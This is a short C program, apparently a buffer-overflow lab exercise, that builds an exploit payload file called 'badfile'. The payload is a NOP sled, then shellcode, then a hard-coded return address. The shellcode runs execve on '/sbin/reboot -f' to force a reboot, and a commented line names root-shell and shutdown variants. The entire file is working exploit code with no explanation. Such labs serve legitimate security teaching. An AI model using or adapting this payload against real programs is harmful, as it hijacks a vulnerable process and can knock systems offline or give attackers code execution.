#include<stdio.h>
#include<string.h>

char ret_addr[] = "\x60\xef\xff\xbf";
char restart_shellcode[] = "\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e"
                  "\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3"
                  "\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53"
                  "\x89\xe1\xb0\x0b\xcd\x80";

char nop[] = "\x90";

int main(){
	FILE* badf;
	badf = fopen("badfile","w");
	char buff[517];
	int ind = 0;
	for(;ind<376;ind++)
		buff[ind] = nop[0];
	for(int i=0;i<strlen(restart_shellcode);i++){
		buff[ind++] = restart_shellcode[i];
	}
	for(int i=0;i<strlen(ret_addr);i++){
		buff[ind++] = ret_addr[i];
	}
//	printf("%d %d",strlen(root_shell), strlen(shutdown_shellcode));
	
	//buff[ind] = '\0';
	fwrite(buff,517,1,badf);
	return 0;
}
